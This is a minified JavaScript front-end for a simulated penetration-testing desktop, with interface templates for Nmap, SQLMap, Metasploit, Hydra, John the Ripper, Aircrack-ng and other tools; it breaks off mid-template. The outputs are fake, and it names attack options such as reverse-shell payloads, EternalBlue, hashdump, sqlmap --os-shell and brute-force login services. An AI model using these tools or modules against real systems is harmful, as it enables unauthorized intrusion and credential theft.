(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const n of document.querySelectorAll('link[rel="modulepreload"]'))o(n);new MutationObserver(n=>{for(const a of n)if(a.type==="childList")for(const i of a.addedNodes)i.tagName==="LINK"&&i.rel==="modulepreload"&&o(i)}).observe(document,{childList:!0,subtree:!0});function s(n){const a={};return n.integrity&&(a.integrity=n.integrity),n.referrerPolicy&&(a.referrerPolicy=n.referrerPolicy),n.crossOrigin==="use-credentials"?a.credentials="include":n.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function o(n){if(n.ep)return;n.ep=!0;const a=s(n);fetch(n.href,a)}})();const ae={terminal:{title:"Terminal",icon:"💻",w:780,h:480},filemanager:{title:"File Manager",icon:"📁",w:780,h:520},nmap:{title:"Nmap Network Scanner",icon:"🌐",w:820,h:580},hashcracker:{title:"Hash Cracker",icon:"🔐",w:740,h:560},sqlmap:{title:"SQLMap",icon:"💉",w:800,h:560},metasploit:{title:"Metasploit Framework",icon:"🎯",w:860,h:580},wireshark:{title:"Wireshark - Packet Analyzer",icon:"📡",w:900,h:580},aircrack:{title:"Aircrack-ng",icon:"📻",w:780,h:540},burpsuite:{title:"Burp Suite Community",icon:"🔥",w:860,h:580},hydra:{title:"Hydra - Brute Force",icon:"🐉",w:760,h:520},john:{title:"John the Ripper",icon:"🗝️",w:740,h:500},browser:{title:"BYT Browser",icon:"🌍",w:820,h:560},texteditor:{title:"Text Editor",icon:"📝",w:720,h:500},settings:{title:"Settings",icon:"⚙️",w:700,h:520},sysinfo:{title:"System Information",icon:"📊",w:720,h:540},whois:{title:"Whois Lookup",icon:"🔍",w:700,h:480},dnslookup:{title:"DNS Lookup",icon:"📡",w:700,h:480},traceroute:{title:"Traceroute",icon:"🗺️",w:700,h:480},subdomains:{title:"Subdomain Finder",icon:"🕸️",w:720,h:500},nikto:{title:"Nikto Web Scanner",icon:"🛡️",w:760,h:520},openvas:{title:"OpenVAS",icon:"🔬",w:760,h:520},wpscan:{title:"WPScan",icon:"📰",w:740,h:500},xsshunter:{title:"XSS Hunter",icon:"⚡",w:760,h:520},dirb:{title:"DirBuster",icon:"📂",w:760,h:520},wordlist:{title:"Wordlist Generator",icon:"📋",w:700,h:500},wifianalyzer:{title:"WiFi Analyzer",icon:"📶",w:780,h:520},kismet:{title:"Kismet",icon:"📡",w:800,h:560},setoolkit:{title:"Social Engineer Toolkit",icon:"🎭",w:780,h:540},shellgen:{title:"Shellcode Generator",icon:"🐚",w:760,h:520},arpspoof:{title:"ARP Spoofer",icon:"⚠️",w:720,h:480},sslstrip:{title:"SSLStrip",icon:"🔓",w:720,h:480},binwalk:{title:"Binwalk",icon:"🔎",w:740,h:500},autopsy:{title:"Autopsy Digital Forensics",icon:"🔬",w:860,h:580},steghide:{title:"Steghide",icon:"🖼️",w:700,h:480},mcphub:{title:"MCP Hub - Server & Tool Manager",icon:"⚡",w:880,h:620},aicopilot:{title:"AI Pentest Copilot (MCP)",icon:"🤖",w:860,h:620}};function ie(e){return`
  <div class="terminal-container" id="tc-${e}">
    <div class="terminal-tabs" id="ttabs-${e}">
      <div class="term-tab active" id="tab0-${e}" onclick="switchTermTab(0,'${e}')">bash 1</div>
      <div class="term-add-tab" onclick="addTermTab('${e}')">＋</div>
    </div>
    <div class="terminal-output" id="to-0-${e}"></div>
    <div class="terminal-input-row">
      <span class="terminal-prompt-label" id="tprompt-${e}">┌──(root㉿byt)-[~]<br>└─# </span>
      <input class="terminal-input" id="ti-${e}" type="text" autocomplete="off" spellcheck="false"
        onkeydown="termKeyDown(event,'${e}')" placeholder="" />
    </div>
  </div>`}function le(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🌐</div>
      <div class="tool-header-info">
        <h3>Nmap 7.94SVN - Network Scanner</h3>
        <p>Network discovery and security auditing</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Target</div>
        <div class="tool-row">
          <div class="tool-field"><label>Target IP / Range</label>
            <input class="tool-input" id="nmap-target-${e}" placeholder="192.168.1.0/24 or target.com" />
          </div>
          <div class="tool-field"><label>Port Range</label>
            <input class="tool-input" id="nmap-ports-${e}" value="1-1000" />
          </div>
          <div class="tool-field"><label>Scan Type</label>
            <select class="tool-select" id="nmap-type-${e}">
              <option value="sS">-sS SYN Stealth</option>
              <option value="sV">-sV Version Detection</option>
              <option value="sU">-sU UDP Scan</option>
              <option value="O">-O OS Detection</option>
              <option value="A">-A Aggressive</option>
              <option value="sn">-sn Ping Sweep</option>
              <option value="p-">-p- All Ports</option>
            </select>
          </div>
        </div>
        <div class="tool-section-title">Options</div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="nmap-os-${e}"> OS Detection</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-sv-${e}" checked> Version Detect</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-sc-${e}"> Default Scripts</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-v-${e}"> Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-6-${e}"> IPv6</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-t5-${e}"> Timing T5</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runNmap('${e}')">▶ Start Scan</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="nmap-prog-${e}"><div class="tool-progress-bar" id="nmap-bar-${e}"></div></div>
      <div class="tool-output" id="nmap-out-${e}">
        <span class="out-info">// Ready. Enter a target and click Start Scan.</span>
      </div>
    </div>
  </div>`}function re(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🔐</div>
      <div class="tool-header-info">
        <h3>Hash Cracker</h3>
        <p>Identify and crack common hash types using wordlists</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Hash Type</div>
        <div class="hash-types" id="hash-types-${e}">
          ${["MD5","SHA-1","SHA-256","SHA-512","NTLM","bcrypt","LM","MySQL","CRC32","Whirlpool","RIPEMD-160","SHA-3"].map((t,s)=>`<div class="hash-type-btn${s===0?" active":""}" onclick="selectHashType(this,'${t}','${e}')">${t}</div>`).join("")}
        </div>
      </div>
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Hash Value</label>
            <input class="tool-input" id="hash-val-${e}" placeholder="Paste hash here..." />
          </div>
          <div class="tool-field"><label>Attack Mode</label>
            <select class="tool-select" id="hash-mode-${e}">
              <option>Dictionary Attack</option>
              <option>Brute Force</option>
              <option>Rainbow Table</option>
              <option>Hybrid Attack</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>Wordlist</label>
            <select class="tool-select" id="hash-wl-${e}">
              <option>rockyou.txt (14.3M words)</option>
              <option>darkweb2017.txt (9.8M words)</option>
              <option>kaonashi.txt (6.7M words)</option>
              <option>hashkiller.txt (3.2M words)</option>
              <option>custom.txt</option>
            </select>
          </div>
          <div class="tool-field"><label>Charset (Brute)</label>
            <input class="tool-input" id="hash-charset-${e}" value="abcdefghijklmnopqrstuvwxyz0123456789" />
          </div>
          <div class="tool-field"><label>Max Length</label>
            <input class="tool-input" id="hash-len-${e}" value="8" style="width:60px" />
          </div>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runHashCracker('${e}')">▶ Start Cracking</button>
        <button class="tool-btn btn-success" onclick="identifyHash('${e}')">🔍 Identify Hash</button>
        <button class="tool-btn" style="border:1px solid var(--accent-cyan);color:var(--accent-cyan)" onclick="generateHash('${e}')">⚡ Generate Hashes</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="hash-prog-${e}"><div class="tool-progress-bar" id="hash-bar-${e}"></div></div>
      <div class="tool-output" id="hash-out-${e}">
        <span class="out-info">// Paste a hash, select type, and click Start Cracking.</span>
      </div>
    </div>
  </div>`}function ce(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">💉</div>
      <div class="tool-header-info">
        <h3>SQLMap 1.7.11 - SQL Injection Tool</h3>
        <p>Automatic SQL injection and database takeover</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Target URL</label>
            <input class="tool-input" id="sql-url-${e}" placeholder="https://target.com/page.php?id=1" />
          </div>
          <div class="tool-field"><label>HTTP Method</label>
            <select class="tool-select" id="sql-method-${e}">
              <option>GET</option><option>POST</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>POST Data</label>
            <input class="tool-input" id="sql-data-${e}" placeholder="username=admin&password=test" />
          </div>
          <div class="tool-field"><label>Technique</label>
            <select class="tool-select" id="sql-tech-${e}">
              <option value="B">Boolean-based blind</option>
              <option value="E">Error-based</option>
              <option value="U">Union query</option>
              <option value="S">Stacked queries</option>
              <option value="T">Time-based blind</option>
              <option value="Q">Inline queries</option>
            </select>
          </div>
          <div class="tool-field"><label>DBMS</label>
            <select class="tool-select" id="sql-dbms-${e}">
              <option>Auto-Detect</option>
              <option>MySQL</option>
              <option>PostgreSQL</option>
              <option>MSSQL</option>
              <option>Oracle</option>
              <option>SQLite</option>
            </select>
          </div>
        </div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="sql-dbs-${e}"> --dbs (databases)</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-tables-${e}"> --tables</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-dump-${e}"> --dump</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-batch-${e}" checked> --batch</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-rand-${e}"> --random-agent</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-crawl-${e}"> --crawl</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-tor-${e}"> --tor</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-shell-${e}"> --os-shell</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runSQLMap('${e}')">▶ Run SQLMap</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="sql-prog-${e}"><div class="tool-progress-bar" id="sql-bar-${e}"></div></div>
      <div class="tool-output" id="sql-out-${e}">
        <span class="out-info">// Enter a URL with parameters and click Run SQLMap.</span>
      </div>
    </div>
  </div>`}function de(e){return`
  <div class="msf-container">
    <div class="msf-sidebar">
      <div class="msf-cat">Auxiliary</div>
      ${["scanner/portscan/tcp","scanner/smb/smb_ms17_010","scanner/http/http_version","scanner/ftp/ftp_version","scanner/ssh/ssh_version","gather/shodan_search"].map(t=>`<div class="msf-module-item" onclick="selectMSFModule(this,'${t}','${e}')">${t}</div>`).join("")}
      <div class="msf-cat">Exploits</div>
      ${["windows/smb/ms17_010_eternalblue","unix/ftp/vsftpd_234_backdoor","multi/handler","windows/mssql/mssql_payload","multi/samba/usermap_script","linux/http/apache_mod_cgi_bash_env"].map(t=>`<div class="msf-module-item" onclick="selectMSFModule(this,'${t}','${e}')">${t}</div>`).join("")}
      <div class="msf-cat">Payloads</div>
      ${["windows/meterpreter/reverse_tcp","linux/x86/meterpreter/reverse_tcp","cmd/unix/reverse_bash","python/meterpreter/reverse_tcp"].map(t=>`<div class="msf-module-item" onclick="selectMSFModule(this,'${t}','${e}')">${t}</div>`).join("")}
      <div class="msf-cat">Post</div>
      ${["multi/recon/local_exploit_suggester","windows/gather/hashdump","linux/gather/hashdump"].map(t=>`<div class="msf-module-item" onclick="selectMSFModule(this,'${t}','${e}')">${t}</div>`).join("")}
    </div>
    <div class="msf-main">
      <div style="padding:10px 14px;background:var(--bg-darker);border-bottom:1px solid var(--border);font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan)" id="msf-module-title-${e}">
        msf6 > select a module from the list
      </div>
      <div style="padding:12px;display:flex;flex-direction:column;gap:8px;background:var(--bg-darker);border-bottom:1px solid var(--border)" id="msf-options-${e}">
        <div style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">Select a module to configure options</div>
      </div>
      <div class="terminal-output" id="msf-out-${e}" style="flex:1;min-height:200px">
        <span class="info" style="color:var(--accent-red);font-weight:700">
       ___  ___  ___ ___  ___ ___ _    ___  ___ _____ <br>
      | __|/   | __| __|| __| __| |  / _ |_ _|_   _|<br>
      | _| | - || _|| _| | _|| _|| |_| (_) || |  | |  <br>
      |___|___|_|  |_|  |_| |___|____|___/|___| |_|  <br>
        </span>
        <br>
        <span class="info" style="color:var(--text-secondary)">       =[ metasploit v6.3.44-dev            ]<br>
+ -- --=[ 2376 exploits - 1232 auxiliary - 415 post ]<br>
+ -- --=[ 1171 payloads - 46 encoders - 11 nops     ]<br>
+ -- --=[ 9 evasion                                  ]<br></span>
        <br>
        <span class="prompt">msf6 > </span>
      </div>
      <div class="terminal-input-row">
        <span class="terminal-prompt-label">msf6 > </span>
        <input class="terminal-input" id="msf-input-${e}" onkeydown="msfCommand(event,'${e}')" placeholder="type help for commands..." />
      </div>
    </div>
  </div>`}function pe(e){let t="";const s=["TCP","UDP","HTTP","DNS","ARP","ICMP","TCP","UDP","HTTP","DNS","TCP","UDP","ICMP","HTTP","ARP"],o=["192.168.1.101","10.0.0.5","172.16.0.2","192.168.1.1","10.10.10.50","8.8.8.8","192.168.0.15"];for(let n=0;n<15;n++){const a=s[n],i=o[Math.floor(Math.random()*o.length)],l=o[Math.floor(Math.random()*o.length)],r=Math.floor(Math.random()*1400)+40,b={TCP:"pkt-tcp",UDP:"pkt-udp",HTTP:"pkt-http",DNS:"pkt-dns",ARP:"pkt-arp",ICMP:"pkt-icmp"};t+=`<tr onclick="inspectPacket(this,'${a}','${i}','${l}','${e}')"><td>${n+1}</td><td>${(n*.123).toFixed(3)}</td><td>${i}</td><td>${l}</td>
      <td class="${b[a]||""}">${a}</td><td>${r}</td><td class="out" style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${z(a)}</td></tr>`}return`
  <div class="tool-panel ws-inspector-container">
    <div class="tool-header">
      <div class="tool-icon">📡</div>
      <div class="tool-header-info">
        <h3>Wireshark 4.2.0 - Packet Analyzer</h3>
        <p>Live packet capture, protocol dissection, and hex inspector</p>
      </div>
    </div>
    <div style="padding:6px 12px;background:var(--bg-darker);border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center">
      <input class="tool-input" style="flex:1;padding:5px 10px;font-size:0.78rem" id="ws-filter-${e}" placeholder="Filter: tcp.port == 80 or ip.addr == 192.168.1.1" />
      <button class="tool-btn btn-primary" style="padding:5px 12px" onclick="applyWsFilter('${e}')">Apply</button>
      <button class="tool-btn btn-success" style="padding:5px 12px" onclick="startCapture('${e}')">▶ Capture</button>
      <button class="tool-btn btn-danger" style="padding:5px 12px" onclick="stopCapture('${e}')">■ Stop</button>
    </div>
    <div style="flex:1;overflow-y:auto;max-height:180px">
      <table class="packet-table" id="ws-table-${e}">
        <thead><tr><th>No.</th><th>Time</th><th>Source</th><th>Destination</th><th>Protocol</th><th>Length</th><th>Info</th></tr></thead>
        <tbody>${t}</tbody>
      </table>
    </div>
    <!-- Protocol Details Pane -->
    <div class="ws-details-pane" id="ws-details-${e}">
      <span style="color:var(--text-dim)">Click any packet in the table above to dissect protocol headers...</span>
    </div>
    <!-- Hex Dump Pane -->
    <div class="ws-hex-pane" id="ws-hex-${e}">
      <span style="color:var(--text-dim)">Raw packet payload hex dump</span>
    </div>
    <div style="padding:6px 12px;background:var(--bg-darker);border-top:1px solid var(--border);font-family:var(--font-mono);font-size:0.72rem;color:var(--text-dim)">
      <span id="ws-status-${e}">Capturing on eth0 | 15 packets captured | Promiscuous mode: ACTIVE</span>
    </div>
  </div>`}function z(e){const s={TCP:["SYN Seq=0 Win=65535 Len=0","ACK Seq=1 Ack=1 Win=64240","FIN, ACK Seq=156 Ack=230","PSH, ACK Seq=230 Ack=157"],UDP:["Source port: 53, Destination port: 1024","Source port: 1234, Destination port: 443"],HTTP:["GET /index.php HTTP/1.1","POST /login HTTP/1.1","HTTP/1.1 200 OK"],DNS:["Standard query 0x1234 A google.com","Standard query response 0x1234 A 142.250.77.78"],ARP:["Who has 192.168.1.1? Tell 192.168.1.100","192.168.1.1 is at 00:1a:2b:3c:4d:5e"],ICMP:["Echo (ping) request id=0x0001 seq=1/256","Echo (ping) reply id=0x0001 seq=1/256"]}[e]||["Unknown packet"];return s[Math.floor(Math.random()*s.length)]}function ue(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">📻</div>
      <div class="tool-header-info">
        <h3>Aircrack-ng 1.7</h3>
        <p>WiFi network security assessment suite</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Interface & Mode</div>
        <div class="tool-row">
          <div class="tool-field"><label>Interface</label>
            <select class="tool-select" id="air-iface-${e}">
              <option>wlan0</option><option>wlan1</option><option>wlan0mon</option>
            </select>
          </div>
          <div class="tool-field"><label>Mode</label>
            <select class="tool-select" id="air-mode-${e}">
              <option>airodump-ng (Capture)</option>
              <option>aircrack-ng (Crack)</option>
              <option>aireplay-ng (Inject)</option>
              <option>airmon-ng (Monitor)</option>
            </select>
          </div>
          <div class="tool-field"><label>Channel</label>
            <input class="tool-input" id="air-ch-${e}" value="all" />
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>BSSID / Target</label>
            <input class="tool-input" id="air-bssid-${e}" placeholder="AA:BB:CC:DD:EE:FF (optional)" />
          </div>
          <div class="tool-field"><label>Capture File</label>
            <input class="tool-input" id="air-cap-${e}" value="capture" />
          </div>
        </div>
      </div>
      <div class="tool-section">
        <div class="tool-section-title">Detected Networks</div>
        <div class="tool-output" style="min-height:120px">
          <span class="out-header">BSSID              PWR  Beacons  #Data  CH  MB   ENC   CIPHER AUTH  ESSID</span><br>
          ${Y()}
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runAircrack('${e}')">▶ Start</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn btn-success" onclick="enableMonitor('${e}')">📻 Enable Monitor Mode</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="air-prog-${e}"><div class="tool-progress-bar" id="air-bar-${e}"></div></div>
      <div class="tool-output" id="air-out-${e}">
        <span class="out-info">// Select interface and mode, then click Start.</span>
      </div>
    </div>
  </div>`}function Y(){return[["AA:BB:CC:DD:EE:01","-62","120","45","6","54","WPA2","CCMP","PSK","HomeNetwork_5G"],["11:22:33:44:55:02","-71","89","12","11","54","WPA2","CCMP","PSK","NETGEAR_Office"],["DE:AD:BE:EF:00:03","-55","234","128","1","54","WEP","WEP","OPN","OldRouter"],["FE:DC:BA:98:76:04","-80","45","3","6","300","WPA2","CCMP","PSK","iPhone_Hotspot"],["00:11:22:33:44:05","-67","156","67","6","54","WPA3","CCMP","SAE","SecureNet_2.4"]].map(t=>`<span class="out-line">${t[0]}   ${t[1]}  ${t[2]}       ${t[3]}  ${t[4]}  ${t[5]}  ${t[6]}  ${t[7]}    ${t[8]}   ${t[9]}</span>`).join("<br>")}function me(e){return`
  <div class="tool-panel" style="height:100%">
    <div class="burp-tabs" id="burp-tabs-${e}">
      <div class="burp-tab active" onclick="switchBurpTab('proxy','${e}')">Proxy</div>
      <div class="burp-tab" onclick="switchBurpTab('scanner','${e}')">Scanner</div>
      <div class="burp-tab" onclick="switchBurpTab('repeater','${e}')">Repeater</div>
      <div class="burp-tab" onclick="switchBurpTab('intruder','${e}')">Intruder</div>
      <div class="burp-tab" onclick="switchBurpTab('decoder','${e}')">Decoder</div>
    </div>
    <div class="tool-body" id="burp-body-${e}">
      <!-- Proxy Tab -->
      <div id="burp-proxy-${e}" class="burp-section">
        <div class="tool-section">
          <div class="tool-section-title">Proxy Settings</div>
          <div class="tool-row">
            <div class="tool-field"><label>Listen Port</label><input class="tool-input" value="8080" id="burp-port-${e}" /></div>
            <div class="tool-field"><label>Bind Address</label><input class="tool-input" value="127.0.0.1" id="burp-bind-${e}" /></div>
            <div class="tool-field" style="justify-content:flex-end">
              <button class="tool-btn btn-success" onclick="toggleProxy('${e}')">▶ Start Proxy</button>
            </div>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">Intercepted Requests</div>
          <div class="tool-output" style="min-height:160px" id="burp-intercept-${e}">
            <span class="out-info">// Proxy is stopped. Start the proxy to intercept traffic.</span>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">HTTP History</div>
          <div class="tool-output" style="min-height:80px">
            <span class="out-header">Method  URL                                  Status  Length  MIME</span><br>
            <span class="out-success">GET     /index.php                           200     4521    HTML</span><br>
            <span class="out-warn">POST    /login.php                           302     0       -</span><br>
            <span class="out-line">GET     /dashboard.php                       200     8934    HTML</span>
          </div>
        </div>
      </div>
    </div>
  </div>`}function ve(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🐉</div>
      <div class="tool-header-info">
        <h3>Hydra 9.5 - Brute Force Login Tool</h3>
        <p>Online password brute force attack tool</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field"><label>Target IP</label><input class="tool-input" id="hydra-ip-${e}" placeholder="192.168.1.1" /></div>
          <div class="tool-field"><label>Port</label><input class="tool-input" id="hydra-port-${e}" placeholder="22" /></div>
          <div class="tool-field"><label>Service</label>
            <select class="tool-select" id="hydra-svc-${e}">
              <option>ssh</option><option>ftp</option><option>http-post-form</option>
              <option>rdp</option><option>smtp</option><option>pop3</option>
              <option>imap</option><option>mysql</option><option>mssql</option>
              <option>vnc</option><option>telnet</option><option>ldap</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>Username / List</label><input class="tool-input" id="hydra-user-${e}" placeholder="admin or users.txt" /></div>
          <div class="tool-field"><label>Password / List</label><input class="tool-input" id="hydra-pass-${e}" placeholder="password or rockyou.txt" /></div>
          <div class="tool-field"><label>Threads</label><input class="tool-input" id="hydra-threads-${e}" value="16" /></div>
        </div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="hydra-v-${e}" checked> Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-vv-${e}"> Very Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-s-${e}"> SSL</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-r-${e}"> Restore</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-e-${e}"> Empty password</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runHydra('${e}')">▶ Start Attack</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="hydra-prog-${e}"><div class="tool-progress-bar" id="hydra-bar-${e}"></div></div>
      <div class="tool-output" id="hydra-out-${e}">
        <span class="out-info">// Configure target and credentials, then click Start Attack.</span>
      </div>
    </div>
  </div>`}function fe(e){return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🗝️</div>
      <div class="tool-header-info">
        <h3>John the Ripper 1.9.0-jumbo-1</h3>
        <p>Offline password hash cracker</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Hash File or Paste Hashes</label>
            <textarea class="tool-input" id="john-hashes-${e}" rows="4" style="resize:none"
              placeholder="root:$6$salt$hash...&#10;admin:$1$abc$xyz...&#10;Or paste hashes directly"></textarea>
          </div>
          <div class="tool-field">
            <div class="tool-field"><label>Format</label>
              <select class="tool-select" id="john-format-${e}">
                <option>auto</option><option>md5crypt</option><option>sha512crypt</option>
                <option>descrypt</option><option>bfegg</option><option>krb5</option>
                <option>NT</option><option>bcrypt</option><option>raw-MD5</option>
              </select>
            </div>
            <div class="tool-field" style="margin-top:8px"><label>Mode</label>
              <select class="tool-select" id="john-mode-${e}">
                <option value="wordlist">Wordlist</option>
                <option value="incremental">Incremental</option>
                <option value="single">Single Crack</option>
                <option value="rules">Rules-based</option>
              </select>
            </div>
            <div class="tool-field" style="margin-top:8px"><label>Wordlist</label>
              <select class="tool-select" id="john-wl-${e}">
                <option>/usr/share/wordlists/rockyou.txt</option>
                <option>/usr/share/wordlists/fasttrack.txt</option>
                <option>/usr/share/wordlists/john.lst</option>
              </select>
            </div>
          </div>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runJohn('${e}')">▶ Start Cracking</button>
        <button class="tool-btn btn-success" onclick="johnShow('${e}')">👁 Show Cracked</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="john-prog-${e}"><div class="tool-progress-bar" id="john-bar-${e}"></div></div>
      <div class="tool-output" id="john-out-${e}">
        <span class="out-info">// Paste hashes or upload a hash file, then click Start Cracking.</span>
      </div>
    </div>
  </div>`}function be(e){return`
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="browser-toolbar">
      <button class="browser-nav-btn" onclick="browserNav('back','${e}')">◀</button>
      <button class="browser-nav-btn" onclick="browserNav('fwd','${e}')">▶</button>
      <button class="browser-nav-btn" onclick="browserNav('reload','${e}')">↻</button>
      <input class="browser-url-bar" id="browser-url-${e}" value="byt://newtab" onkeydown="browserGo(event,'${e}')" />
      <button class="browser-nav-btn" onclick="browserGo({key:'Enter'},'${e}')">→</button>
    </div>
    <div class="browser-body" id="browser-body-${e}">
      <div class="browser-homepage">
        <h2>🐉 Build <span class="accent-u">U</span> Too</h2>
        <p style="color:var(--text-dim);font-family:var(--font-mono);font-size:0.8rem">Penetration Testing Browser</p>
        <div class="browser-search-bar">
          <input id="browser-search-${e}" type="text" placeholder="Search Exploit-DB, CVE, tools..." />
          <button onclick="browserSearch('${e}')">Search</button>
        </div>
        <div class="browser-bookmarks">
          ${[["🔴","Exploit-DB","https://exploit-db.com"],["📋","CVE Details","https://cvedetails.com"],["🔧","OWASP","https://owasp.org"],["🌐","Shodan","https://shodan.io"],["📡","NVD","https://nvd.nist.gov"],["🔐","HaveIBeenPwned","https://haveibeenpwned.com"]].map(([t,s,o])=>`<div class="bookmark-item" onclick="document.getElementById('browser-url-${e}').value='${o}';browserLoad('${o}','${e}')">
              <div class="bookmark-icon">${t}</div>${s}</div>`).join("")}
        </div>
      </div>
    </div>
  </div>`}function he(e){return`
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="editor-toolbar">
      <button class="editor-btn" onclick="editorNew('${e}')">New</button>
      <button class="editor-btn" onclick="editorSave('${e}')">Save</button>
      <button class="editor-btn" onclick="editorOpen('${e}')">Open</button>
      <div style="flex:1"></div>
      <select class="tool-select" style="font-size:0.72rem;padding:3px 8px" id="editor-lang-${e}">
        <option>Plain Text</option><option>Python</option><option>Bash</option>
        <option>JavaScript</option><option>PHP</option><option>Ruby</option><option>Perl</option>
      </select>
    </div>
    <div style="display:flex;flex:1;overflow:hidden">
      <div style="background:#0a0c10;padding:10px 6px;font-family:var(--font-mono);font-size:0.82rem;
        line-height:1.7;color:var(--text-dim);text-align:right;min-width:42px;border-right:1px solid var(--border);
        overflow:hidden;user-select:none" id="editor-lines-${e}">1</div>
      <textarea class="editor-area" id="editor-area-${e}"
        oninput="updateEditorLines('${e}')"
        onscroll="syncEditorScroll('${e}')"
        placeholder="# BuildU Text Editor&#10;# Start typing..."></textarea>
    </div>
    <div class="editor-statusbar">
      <span id="editor-pos-${e}">Ln 1, Col 1</span>
      <span id="editor-lang-status-${e}">Plain Text</span>
      <span>UTF-8</span>
      <span>LF</span>
    </div>
  </div>`}function ye(e){return`
  <div class="settings-layout">
    <div class="settings-sidebar">
      <div class="settings-sidebar-item active" onclick="switchSettings('appearance','${e}',this)">🎨 Appearance</div>
      <div class="settings-sidebar-item" onclick="switchSettings('network','${e}',this)">🌐 Network</div>
      <div class="settings-sidebar-item" onclick="switchSettings('security','${e}',this)">🔐 Security</div>
      <div class="settings-sidebar-item" onclick="switchSettings('terminal','${e}',this)">💻 Terminal</div>
      <div class="settings-sidebar-item" onclick="switchSettings('about','${e}',this)">ℹ️ About</div>
    </div>
    <div class="settings-main">
      <div id="settings-appearance-${e}" class="settings-section active">
        <div class="settings-group">
          <h3>Theme</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Accent Color</div>
              <div class="settings-row-sub">Choose your accent color</div></div>
            <div class="color-picker-row">
              ${[["#00d4ff","cyan"],["#b000ff","purple"],["#39ff14","green"],["#ff2244","red"],["#ff6b00","orange"],["#ffcc00","yellow"]].map(([t,s])=>`<div class="color-swatch${t==="#00d4ff"?" active":""}" style="background:${t}" title="${s}" onclick="setAccentColor('${t}','${e}',this)"></div>`).join("")}
            </div>
          </div>
          <div class="settings-row">
